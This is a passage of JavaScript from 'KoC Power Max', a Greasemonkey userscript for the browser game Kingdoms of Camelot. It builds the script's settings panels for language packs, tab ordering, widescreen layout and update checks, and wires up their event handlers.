	 ab.className="mod_comm_set";
	 channel_input.appendChild(ab);
	 ab.innerHTML=""+culang.Osmileys+"";
		
	 ab.addEventListener ('click', function() {
	 t.EmoHelp();
	 }, false);
}

    t.myDiv = div;
	t.myDiv.style.overflowY = 'auto';
    t.myDiv.innerHTML = '<div class=pdxStat>KOC POWER - '+culang.Hsettings+'</div>	<TABLE class=pdxTab align=center><TR><TD>	<INPUT class=pdxSubtab ID=ptmrchSubO type=submit  value=Power></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubN type=submit   value=Bot></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubT type=submit   value=Tools></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubS type=submit   value=Style></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubC type=submit   value=Colors></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubL type=submit   value=Layout></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubTabs type=submit   value=Tabs></td>			<TD><INPUT class=pdxSubtab ID=ptmrchSubPlayers type=submit   value=Players></td>		<TD><INPUT class=pdxSubtab ID=ptmrchSubP type=submit   value=Position></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubG type=submit   value=Extras></td><TD><INPUT class=pdxSubtab ID=ptmrchSubX type=submit   value=Links></td></tr>\
	</table><DIV id=ptOptionsOutput style=" "></div>';
    t.optionsDiv = document.getElementById('ptOptionsOutput');
    document.getElementById('ptmrchSubO').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubT').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubN').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubS').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubL').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubTabs').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubPlayers').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubP').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubC').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubG').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubX').addEventListener('click', e_butSubtab, false);
	
    changeSubtab (document.getElementById('ptmrchSubO'));

    function e_butSubtab (evt){
      changeSubtab (evt.target);
    }

    function changeSubtab (but){
      if (but == t.curTabBut)
        return;
      if (t.curTabBut){
        t.curTabBut.className='pdxSubtab';
        t.curTabBut.disabled=false;
      }
      t.curTabBut = but;
      but.className='pdxSubtab pdxSubtabSel';
      but.disabled=true;
      t.curTabName = but.id.substr(9);
      t.show ();
    }
  },

  hide : function (){
    var t = Tabs.Options;
    clearTimeout (t.displayTimer);
      mainPop.div.style.width = 850 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
    var t = Tabs.Options;
    clearTimeout (t.displayTimer);
      mainPop.div.style.width = 850 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    if (t.curTabName == 'T')
      t.showTools();
    else if (t.curTabName == 'N')
      t.showBot();
    else if (t.curTabName == 'S')
      t.showStyle();
	else if (t.curTabName == 'L')
      t.showLayoutWallpaper();
    else if (t.curTabName == 'G')
      t.showPDXxTraStuff();
    else if (t.curTabName == 'X')
      t.showXtrLink();
	else if (t.curTabName == 'P')
      t.showPosition();
	else if (t.curTabName == 'C')
      t.showColors();
	else if (t.curTabName == 'Tabs')
      t.showTabs();	
	else if (t.curTabName == 'Players')
      t.showPlayers();
    else
      t.showOptions();

  },
/**********************************************************/
/************ KOC POWER - SUBTABS POWER ******************/
/********************************************************/
   showOptions : function (){
    var t = Tabs.Options;

    try {
	var m = '<DIV style=" max-height:750px;">';
	m += '<TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
		<TR><TD colspan=2><div class=pdxStat>KOC POWER - '+culang.Hsettings+'</div></td></tr>\
		<TR><TD width="10"><INPUT id=pbEveryEnable type=checkbox '+ (Options.pbEveryEnable?'CHECKED ':'') +'/></td><TD width="1000">'+culang.OpbEveryEnable+' \
		<INPUT id=pbeverymins type=text size=2 maxlength=3 \> '+culang.OpbEveryEnable2+' </td></tr>\
		<TR><TD><INPUT id=pdxSessionRefresh type=checkbox  '+ (Options.sessionRefresh?'CHECKED ':'') +' /></td><TD>'+culang.OsessionRefresh+'</td></tr>\
		<TR><TD><INPUT id=pballowWinMove type=checkbox /></td><TD>'+culang.OpballowWinMove+'</td></tr>\
		<TR><TD><INPUT id=pbTrackWinOpen type=checkbox /></td><TD>'+culang.OpbTrackWinOpen +'</td></tr>\
		<TR><TD><INPUT id=pdxTournamentCheck type=checkbox '+ (Options.enableCheckTournament?'CHECKED ':'') +'/></td><TD> '+culang.chkTournament+'</td></tr>\
		<TR><TD><INPUT id=togSmiley type=checkbox /></td><TD>'+culang.Osmileys+' <INPUT id=EmoHelp type=submit value="'+culang.helpbutton+'"></td></tr>\
		<TR><TD><INPUT id=pbHideOnGoto type=checkbox /></td><TD>'+culang.OpbHideOnGoto +'</td></tr>\
		<TD><INPUT id=pdxwidescreenEnable type=checkbox '+ (Options.widescreen?'CHECKED ':'') +'/></td><TD>'+culang.OpdxwidescreenEnable+'</td></tr>\
		<TR><TD><INPUT id=togForceMarchUpdates type=checkbox /></td><TD>'+culang.OtogForceMarchUpdates +' <b>(<span class=boldRed>'+culang.OtogForceMarchUpdatesImp+'</span>)</b></td></tr>\
		<TR><TD><INPUT id=pbupdate type=checkbox '+ (GlobalOptions.pbupdate?'CHECKED ':'') +'/></td><TD>'+culang.Oupd+' '+ htmlSelector({0:''+culang.Oupduserscripts+'', 1:''+culang.OupdgooglecodeBeta+''},GlobalOptions.pbupdatebeta,'id=pbupdatebeta') +' - <INPUT id=pbupdatenow type=submit value="'+culang.updNow+'" /> <b>(<span class=boldRed>'+culang.alldomains+'</span>)</b> '+culang.updnow+' <a href="http://userscripts.org/scripts/source/104137.user.js" target="_blank" title="'+culang.OinstUR+'">'+culang.rlsversion+'</a> | <a href="http://koc-power-pdx.googlecode.com/svn/trunk/koc_power_pdx.user.js" target="_blank" title="'+culang.OinstBT+'">'+culang.beta+'</a></td></tr>\
		<TR><TD colspan=2><div class=pdxStat>'+culang.HLang+'</div></td></tr>\
		<TD colspan=2>'+culang.OLang+' <br><b>(</b><span class=boldRed>'+culang.OLangImp+'</span><b>)</b></td></tr>\
		<TD></TD><TD><B>'+culang.pack+'</B>:\
		<select id=pbLang '+(LangOptions.culang==0?'DISABLED':'')+'/><option value=0 >-- '+culang.select+' --</option>';
		for (var i in LangOptions.langpacks) {
		if(i == LangOptions.culang)
			m += '<option value="'+i+'" selected="selected">'+i+'</option>'; // Load Previous langpack Selection
		else
			 m += '<option value="'+i+'">'+i+'</option>';
		};
		m += '</select><b> '+culang.scriptv+'</b>: <span class=boldRed>'+LangVersion+'</span> <INPUT id=pbupdatelanglist type=submit value='+langpack.updatelangbtn+'>\
		<b><BR><span class=boldRed><u>'+culang.impo+'</u>:</span> '+culang.nolangs+'</b></td></tr>		<TD></td>\
		<TD colspan=2><b>'+culang.lang+'</b>: <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/en.png title="'+culang.useLangEN+'"> en = '+culang.english+' | \
		<img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/de.png title="'+culang.useLangDE+'"> de = '+culang.german+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/fr.png title="'+culang.useLangFR+'"> fr = '+culang.french+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/it.png title="'+culang.useLangIT+'"> it = '+culang.italy+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/es.png title="'+culang.useLangES+'"> es = '+culang.espaniol+' <BR><img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/tr.png title="'+culang.useLangTR+'"> tr = '+culang.turk+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/gr.png title="'+culang.useLangGR+'"> gr = '+culang.greece+' \
		| <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/pt.png title="'+culang.useLangPT+'"> pt = '+culang.portuguese+' \
		- '+culang.Ocomming+'</td></tr>	<TR><TD colspan=2><div class=pdxStat>'+culang.HpdxInfoBar+'</div></td></tr>		<TD></td>		<TD><b>'+culang.Oclock+'</b>: '+ htmlSelector({noneTimeZone:''+culang.none+'', gmtTimeZone:''+culang.OtogGmtClock+'', estTimeZone:''+culang.OtogEstClock+'', cestTimeZone:''+culang.OtogCestClock+'', pstTimeZone:''+culang.OtogPSTClock+''},Options.pdxTimeZones,'id=pdxTimeZones') +' '+culang.OtogTimeZone+' <b>(</b><span class=boldRed>'+culang.needRefresh+'</span><b>)</b>';
        m+= '</td></tr>';
		m += '<TD><INPUT id=togpdxLangFlag type=checkbox /></td><TD>'+culang.pdxLangFlag+' <img height=18 width=17 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/'+culang.langflag+'-24x24.png title="'+culang.pdxLangInfoNote+'"></td></tr>';
		m += '<TD><INPUT id=togpdxTime type=checkbox /></td><TD>'+culang.pdxDate+'</td></tr></table> '+ strButton20(''+culang.resetall+'', 'id=ResetALL') +'<HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';


		t.optionsDiv.innerHTML = m;
  
		t.changeOpt ('pbeverymins', 'pbEveryMins' , RefreshEvery.setTimer);
		t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
		t.togOpt ('togForceMarchUpdates', 'forceMarchUpdate', Tabs.Marches.setEnable);
		t.togOpt ('pballowWinMove', 'pbWinDrag', mainPop.setEnableDrag);
		t.togOpt ('pbTrackWinOpen', 'pbTrackOpen');
		t.togOpt ('pbHideOnGoto', 'hideOnGoto');  
		t.togOpt ('pdxwidescreenEnable', 'widescreen');
		t.togOpt ('pdxSessionRefresh', 'sessionRefresh');
		t.togOpt ('togSmiley', 'Smiley');	
		t.togOpt ('togpdxLangFlag', 'pdxLangFlag');
		t.togOpt ('togpdxTime', 'pdxTime');
		t.togOpt ('pdxTournamentCheck', 'enableCheckTournament');
		
		document.getElementById('EmoHelp').addEventListener('click', function(){ t.EmoHelp(); }, false);	
		document.getElementById('pbupdate').addEventListener ('change', t.e_updateChanged, false);
		document.getElementById('pbupdatebeta').addEventListener ('change', function(){
			GlobalOptions.pbupdatebeta = document.getElementById('pbupdatebeta').value;
			AutoUpdater_104137.beta = GlobalOptions.pbupdatebeta;
			GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
			saveGlobalOptions();
      },false);

	   document.getElementById('pbupdatenow').addEventListener ('click', function(){
	   AutoUpdater_104137.call(true,true);
	    },false);
		
				document.getElementById('pdxTimeZones').addEventListener ('change', function(){
			Options.pdxTimeZones = document.getElementById('pdxTimeZones').value;
			GM_setValue ('Options2_??', JSON2.stringify(Options));
			saveOptions();
      },false);
		document.getElementById('ResetALL').addEventListener ('click', function(){
			var serverID = getServerId();
				RemoveList = (GM_listValues());
				for (i=0;i<RemoveList.length;i++){
				logit(RemoveList[i]);
				GM_deleteValue(RemoveList[i]);
			}
			ResetAll=true;
			reloadKOC();
		},false);
		document.getElementById('pbupdatelanglist').addEventListener ('click', function () {
			GM_xmlhttpRequest({
			method: 'GET',
			url: 'http://koc-power-pdx.googlecode.com/svn/trunk/langpack/',
			headers: {
			'Accept': 'text/javascript',
		},
    onload: function(responseDetails) {
		var exp = /(\w\w)(?=.js<\/a>)/gim;
		var str = responseDetails.responseText;
		var str = str.match(exp);
		for (i in str) {
			if (str.length > i) {
				if(str[i]=="SR") continue;// exclude string resource file
				LangOptions.langpacks[str[i]] = true;
			};
		}
		saveLangOptions();
    }
});
	  }, false);
	  document.getElementById('pbLang').addEventListener ('change', function () {
				LangOptions.culang = this.options[this.selectedIndex].text ;
				saveLangOptions();
	  }, false);

    } catch (e) {
     // myDiv.div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }	
  },


/**********************************************************/
/************ KOC POWER - SUBTABS TABS ******************/
/********************************************************/
   showTabs : function (){
    var t = Tabs.Options;

    try {
		var m = '<DIV style=" max-height:750px;"><DIV class=pdxStat>'+culang.HTabSet+'</div><table class="pdxTab">\
			<tr><td colspan="2"><b><u>1. '+culang.disableTabs+' </b></u></td><td><input type="checkbox" id="togxChangePartner" /></td><td>'+culang.xChange+'</td><td colspan="4"><b><u>2. '+culang.OallianceWebsite+' </u></b></td></tr>\
			<tr><td><input  type="checkbox" id="togdisableTournamentTab" /></td>  <td>'+culang.tournament+'</td>    <td><input type="checkbox" id="togWSCalc" /></td>    <td>'+culang.Calc+'</td>    <td><input type="checkbox" id="togAllyWebTab" /></td><td width="225" colspan="3">'+culang.OallianceWebsite+' </td></tr>\
			<tr><td width="20"><input type="checkbox" id="togdisableWildTab" /></td><td>'+culang.wild+'</td><td><input type="checkbox" id="togkocDunnoTab" /></td><td>'+culang.kocDunno+'</td><td><input  type="checkbox" id="togAllyChatTab" /></td><td colspan="3">'+culang.OallianceTabName2+'</td>  </tr>  <tr>    <td><input  type="checkbox" id="togdisableKnightsTab" /></td>    <td>'+culang.knights+'</td>    <td><input type="checkbox" id="togWSWiKien" /></td>    <td>'+culang.WiKien+'</td><td colspan="4">'+culang.OallianceTabName+'</td>\  </tr>\
			<tr><td><input type="checkbox" id="togdisableCombatTab" /></td>    <td>'+culang.combat+'</td>    <td><input type="checkbox" id="togWSWiKide" /></td>    <td>'+culang.WiKide+'</td> <td>&nbsp;</td><td colspan="3"><input  type="text" id="changeAETabLabel" value="'+StyleOptions.pdxAETabLabel+'" size="15" maxlength="15" /></td></tr>\
			<tr><td><input  type="checkbox" id="togdisableSpamTab" /></td>    <td>'+culang.spam+'</td>    <td><input type="checkbox" id="togWSImo" /></td>    <td>'+culang.Imo+' ('+culang.imsg+')</td><td colspan="4">'+culang.OallianceWebURL+'</td></tr>\
			<tr><td><input type="checkbox" id="togdisableFakeTab" /></td>    <td>'+culang.fake+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="3"><input  type="text" id="changeAlliancePage" value="'+StyleOptions.pdxAlliancePage+'" size="25" maxlength="60"/></td></tr>\
			<tr><td ><input  type="checkbox" id="togdisableResourceTab" /></td>    <td>'+culang.res+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="4">'+culang.OallianceTabName2+'</td></tr>\
			<tr><td><input  type="checkbox" id="togdisableInventarTab" /></td>    <td>'+culang.inventar+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="3"><input  type="text" id="changeWSTabLabel" value="'+StyleOptions.WSTabLab+'" size="15" maxlength="15" /></td></tr>\
			<tr><td><input  type="checkbox" id="togWSUsr" /></td>    <td>'+culang.Usr+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="4">'+culang.OallianceWebURL+'  #2 </td></tr>\
			<tr><td width="20"><input  type="checkbox" id="togWSUpdater" /></td>    <td width="201">'+culang.WSUpdater+'</td>    <td width="20">&nbsp;</td>    <td width="197">&nbsp;</td><td width="20">&nbsp;</td>\<td colspan="3"><input   type="text"  id="changeWebsitePage" value="'+StyleOptions.WebsitePageURL+'" size="25" maxlength="60"/></td></tr>\
				</table><div class=pdxStat>TAB ANORDNUNG</div><table width="700" border="0" cellspacing="0" cellpadding="0">\
			<tr ><td><input type="text" value="'+StyleOptions.toStats+'" id="togtoStats" size="1" maxlength="2" ></td><td>'+culang.overview+' - '+StyleOptions.toStats+'</td><td><input type="text" value="'+StyleOptions.toRitter+'" id="togtoRitter" size="1" maxlength="2" ></td><td>'+culang.knights+' - '+StyleOptions.toRitter+'</td><td><input type="text" value="'+StyleOptions.toSpam+'" id="togtoSpam" size="1" maxlength="2" ></td><td>'+culang.spam+' - '+StyleOptions.toSpam+'</td><td><input type="text" value="'+StyleOptions.toCalc+'" id="togtoCalc" size="1" maxlength="2" ></td><td>'+culang.Calc+' - '+StyleOptions.toCalc+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toHeiligtum+'" id="togtoHeiligtum" size="1" maxlength="2" ></td><td>'+culang.holyplace+' - '+StyleOptions.toHeiligtum+'</td><td><input type="text"  value="'+StyleOptions.toWildnisse+'" id="togtoWildnisse" size="1" maxlength="2" ></td><td>'+culang.wild+' - '+StyleOptions.toWildnisse+'</td><td><input type="text" value="'+StyleOptions.toInfo+'" id="togtoInfo" size="1" maxlength="2" ></td><td>'+culang.info+' - '+StyleOptions.toInfo+'</td><td><input type="text" value="'+StyleOptions.toChat+'"  id="togtoChat" size="1" maxlength="2" ></td><td>'+culang.chat+' - '+StyleOptions.toChat+'</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toBau+'" id="togtoBau" size="1" maxlength="2"></td> <td>'+culang.build+' - '+StyleOptions.toBau+'</td><td><input type="text" value="'+StyleOptions.toFarmen+'" id="togtoFarmen" size="1" maxlength="2" ></td><td>'+culang.raid+' - '+StyleOptions.toFarmen+'</td> <td><input type="text" value="'+StyleOptions.toAlliancePage+'" id="togtoAlliancePage" size="1" maxlength="2" ></td> <td>'+StyleOptions.pdxAETabLabel+' - '+StyleOptions.toAlliancePage+'</td><td><input  type="text" value="'+StyleOptions.toTurnier+'" id="togtoTurnier" size="1" maxlength="2" ></td><td>'+culang.tournament+' - '+StyleOptions.toTurnier+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toAusbildung+'" id="togtoAusbildung" size="1" maxlength="2"></td><td>'+culang.train+' - '+StyleOptions.toAusbildung+'</td><td><input  type="text" value="'+StyleOptions.toMarsch+'" id="togtoMarsch" size="1" maxlength="2" ></td><td>'+culang.march+' - '+StyleOptions.toMarsch+'</td><td><input type="text" value="'+StyleOptions.toWebsitePage+'" id="togtoWebsitePage" size="1" maxlength="2" ></td><td>'+StyleOptions.WSTabLab+' - '+StyleOptions.toWebsitePage+'</td><td><input  type="text" value="'+StyleOptions.toInventar+'" id="togtoInventar" size="1" maxlength="2" ></td><td>'+culang.inventar+' - '+StyleOptions.toInventar+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toKaserne+'" id="togtoKaserne" size="1" maxlength="2"></td><td>'+culang.autotrain+' - '+StyleOptions.toKaserne+'</td><td><input  type="text" value="'+StyleOptions.toWappen+'" id="togtoWappen" size="1" maxlength="2" ></td><td>'+culang.crest+' - '+StyleOptions.toWappen+'</td><td><input type="text" value="'+StyleOptions.toKoCdunno+'" id="togtoKoCdunno" size="1" maxlength="2" ></td><td>'+culang.kocDunno+' - '+StyleOptions.toKoCdunno+'</td><td><input type="text" value="'+StyleOptions.toFake+'" id="togtoFake" size="1" maxlength="2" ></td><td>'+culang.fake+' - '+StyleOptions.toFake+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toTransport+'" id="togtoTransport" size="1" maxlength="2" /></td><td>'+culang.transport+' - '+StyleOptions.toTransport+'</td><td><input  type="text" value="'+StyleOptions.toDarkForest+'" id="togtoDarkForest" size="1" maxlength="2" ></td><td>'+culang.darkforest+' - '+StyleOptions.toDarkForest+'</td><td><input  type="text" value="'+StyleOptions.toUsr+'" id="togtoUsr" size="1" maxlength="2" ></td><td>'+culang.Usr+' - '+StyleOptions.toUsr+'</td><td><input type="text" value="'+StyleOptions.toCombat+'" id="togtoCombat" size="1" maxlength="2" ></td><td>'+culang.combat+' - '+StyleOptions.toCombat+'</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toTruppen+'" id="togtoTruppen" size="1" maxlength="2"></td><td>'+culang.autoreassign+' - '+StyleOptions.toTruppen+'</td><td><input type="text" value="'+StyleOptions.toGeschenke+'" id="togtoGeschenke" size="1" maxlength="2" ></td><td>'+culang.gifts+' - '+StyleOptions.toGeschenke+'</td><td><input type="text" value="'+StyleOptions.toGCode+'" id="togtoGCode" size="1" maxlength="2" ></td><td>'+culang.WSUpdater+' - '+StyleOptions.toGCode+'</td><td><input type="text" value="'+StyleOptions.toCrafting+'" id="togtoCrafting" size="1" maxlength="2" ></td><td>'+culang.crafting+' - '+StyleOptions.toCrafting+'</td></tr>\
			<tr><td><input  type="text" value="'+StyleOptions.toMovement+'" id="togtoMovement" size="1" maxlength="2" ></td><td>'+culang.movement+' - '+StyleOptions.toMovement+'</td><td><input type="text" value="'+StyleOptions.toRessis+'" id="togtoRessis" size="1" maxlength="2" ></td><td>'+culang.resource+' - '+StyleOptions.toRessis+'</td><td><input  type="text" value="'+StyleOptions.toWiKien+'" id="togtoWiKien" size="1" maxlength="2" ></td><td>'+culang.WiKien+' - '+StyleOptions.toWiKien+'</td><td><input type="text" value="'+StyleOptions.toEinstellung+'" id="togtoEinstellung" size="1" maxlength="2" ></td><td>'+culang.options+' - '+StyleOptions.toEinstellung+'</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toSuchen+'" id="togtoSuchen" size="1" maxlength="2"></td><td>'+culang.search+' - '+StyleOptions.toSuchen+'</td><td><input type="text" value="'+StyleOptions.toMitteilung+'" id="togtoMitteilung" size="1" maxlength="2" ></td><td>'+culang.reports+' - '+StyleOptions.toMitteilung+'</td><td><input  type="text"  value="'+StyleOptions.toWiKide+'" id="togtoWiKide" size="1" maxlength="2" ></td><td>'+culang.WiKide+' - '+StyleOptions.toWiKide+'</td><td><input type="text" value="'+StyleOptions.toLog+'" id="togtoLog" size="1" maxlength="2" ></td><td>'+culang.log+' - '+StyleOptions.toLog+'</td></tr>\
			<tr><td><input  type="text" value="'+StyleOptions.toSpieler+'" id="togtoSpieler" size="1" maxlength="2"></td><td>'+culang.player+' - '+StyleOptions.toSpieler+'</td><td><input type="text" value="'+StyleOptions.toAllianz+'" id="togtoAllianz" size="1" maxlength="2" ></td><td>'+culang.alliance+' - '+StyleOptions.toAllianz+'</td><td><input  type="text" value="'+StyleOptions.toImo+'" id="togtoImo" size="1" maxlength="2" ></td><td>'+culang.Imo+' - '+StyleOptions.toImo+'</td><td><input type="text" value="'+StyleOptions.toxChange+'" id="togtoxChange" size="1" maxlength="2" ></td><td>'+culang.xChange+' - '+StyleOptions.toxChange+'</td></tr>\
				</table><center>'+ strButton20(''+culang.Hreset+'', 'id=togResetStyleOpt') +'</center></div>';
		
	t.optionsDiv.innerHTML = m;
	  
	t.togpdxSO ('togdisableKnightsTab', 'disKnightsTab');		t.togpdxSO ('togdisableWildTab', 'disWildTab');		t.togpdxSO ('togdisableCombatTab', 'disCombatTab');		t.togpdxSO ('togdisableSpamTab', 'disSpamTab');		t.togpdxSO ('togdisableFakeTab', 'disFakeTab');		t.togpdxSO ('togdisableResourceTab', 'disResTab');		t.togpdxSO ('togdisableTournamentTab', 'disTourTab');		t.togpdxSO ('togdisableInventarTab', 'disInvTab');		t.togpdxSO ('togAllyWebTab', 'enableWebTab');		t.togpdxSO ('togAllyChatTab', 'enableWebTab2');		t.togpdxSO ('togkocDunnoTab', 'enablekocDunno');		t.togpdxSO ('togxChangePartner', 'enablePartner');		t.togpdxSO ('togWSUpdater', 'enableWSUpdater');		t.togpdxSO ('togWSWiKien', 'enableWSWiKien');		t.togpdxSO ('togWSWiKide', 'enableWSWiKide');		t.togpdxSO ('togWSUsr', 'enableWSUsr');		t.togpdxSO ('togWSImo', 'enableWSImo');		t.togpdxSO ('togWSCalc', 'enableWSCalc');
	t.changepdxSO ('togtoStats', 'toStats');	t.changepdxSO ('togtoHeiligtum', 'toHeiligtum');		t.changepdxSO ('togtoBau', 'toBau');	t.changepdxSO ('togtoAusbildung', 'toAusbildung');		t.changepdxSO ('togtoKaserne', 'toKaserne');	t.changepdxSO ('togtoTransport', 'toTransport');		t.changepdxSO ('togtoTruppen', 'toTruppen');	t.changepdxSO ('togtoMovement', 'toMovement');		t.changepdxSO ('togtoSuchen', 'toSuchen');		t.changepdxSO ('togtoSpieler', 'toSpieler');		t.changepdxSO ('togtoRitter', 'toRitter');		t.changepdxSO ('togtoWildnisse', 'toWildnisse');		t.changepdxSO ('togtoFarmen', 'toFarmen');		t.changepdxSO ('togtoMarsch', 'toMarsch');		t.changepdxSO ('togtoWappen', 'toWappen');		t.changepdxSO ('togtoDarkForest', 'toDarkForest');		t.changepdxSO ('togtoGeschenke', 'toGeschenke');		t.changepdxSO ('togtoRessis', 'toRessis');		t.changepdxSO ('togtoMitteilung', 'toMitteilung');		t.changepdxSO ('togtoAllianz', 'toAllianz');		t.changepdxSO ('togtoSpam', 'toSpam');		t.changepdxSO ('togtoInfo', 'toInfo');		t.changepdxSO ('togtoAlliancePage', 'toAlliancePage');		t.changepdxSO ('togtoWebsitePage', 'toWebsitePage');		t.changepdxSO ('togtoKoCdunno', 'toKoCdunno');		t.changepdxSO ('togtoUsr', 'toUsr');		t.changepdxSO ('togtoGCode', 'toGCode');		t.changepdxSO ('togtoWiKien', 'toWiKien');		t.changepdxSO ('togtoWiKide', 'toWiKide');		t.changepdxSO ('togtoImo', 'toImo');		t.changepdxSO ('togtoCalc', 'toCalc');		t.changepdxSO ('togtoChat', 'toChat');		t.changepdxSO ('togtoTurnier', 'toTurnier');		t.changepdxSO ('togtoInventar', 'toInventar');		t.changepdxSO ('togtoFake', 'toFake');		t.changepdxSO ('togtoCombat', 'toCombat');		t.changepdxSO ('togtoEinstellung', 'toEinstellung');		t.changepdxSO ('togtoLog', 'toLog');		t.changepdxSO ('togtoxChange', 'toxChange');		t.changepdxSO ('togtoCrafting', 'toCrafting');
	t.changepdxSO ('changeAlliancePage', 'pdxAlliancePage');		t.changepdxSO ('changeAETabLabel', 'pdxAETabLabel');
	t.changepdxSO ('changeWebsitePage', 'WebsitePageURL');		t.changepdxSO ('changeWSTabLabel', 'WSTabLab');

	document.getElementById('togResetStyleOpt').addEventListener ('click', function(){
	var serverID = getServerId();
		RemoveList = (GM_listValues());
		for (i=0;i<RemoveList.length;i++){
		
			if (RemoveList[i] == "StyleOptions_"+serverID) GM_deleteValue(RemoveList[i]);
		}
		ResetStyleOptions=true;
		reloadKOC();
	},false);
    } catch (e) {
    }	
  },

/**********************************************************/
/************ KOC POWER - SUBTABS POSITION ***************/
/********************************************************/

 showPosition : function (){
    var t = Tabs.Options;
    try {
	m = '<DIV style=" max-height:750px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
	<TR><TD colspan=2><div class=pdxStat>'+culang.HkpwrsP+'</div></td></tr>\
	<TR><TD width="10"><INPUT id=pbChatREnable type=checkbox /></td><TD width="98%">'+culang.OpbChatREnable  +' <font color=#FF0000>('+culang.needWide+')</font></td></tr>\
		<TR><TD>&nbsp;</td><TD>'+culang.chatWidth+': <INPUT  type=text id=pbchatWidth value="'+Options.chatWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD><INPUT id=pbWMapEnable type=checkbox /></td><TD>'+culang.OpbWMapEnable+ ' <font color=#FF0000>('+culang.need+' '+culang.OneedWideARefresh+')</font></td></tr>\
	<TR><TD></td><TD>'+culang.Opbwidewidth +' <INPUT id=pbwidewidth value="'+Options.widewidth+'" type=text size=8 maxlength=6 \></td></tr>\
	<TR><TD>&nbsp;</td><TD>'+culang.OtogTabWidth +'<INPUT  type=text id=togTabWidth value="'+Colors.TabWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD>&nbsp;</td><TD>'+culang.OwideOptwide+' - '+culang.OwideOptown+' <INPUT type=text id=togWideScreenWidth value="'+Colors.WideScreenWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD><INPUT id=MapExtra type=checkbox /></td><TD>'+culang.OMapExtra +'</td></tr>\
	</table><HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Powered by KoC Power MulitLang Version 1.2.4 by PDX, Re-edited by Larry W. Harrell </a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Power Max Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <BR><BR><BR></a></span></center></td>\
           </table></div>';

		   
	t.optionsDiv.innerHTML = m;

	t.togOpt ('MapExtra', 'MapShowExtra');
	t.togOpt ('pbChatREnable', 'pbChatOnRight', WideScreen.setChatOnRight);
	t.togOpt ('pbWMapEnable', 'pbWideMap', WideScreen.useWideMap);
    t.changeOpt ('pbwidewidth', 'widewidth');
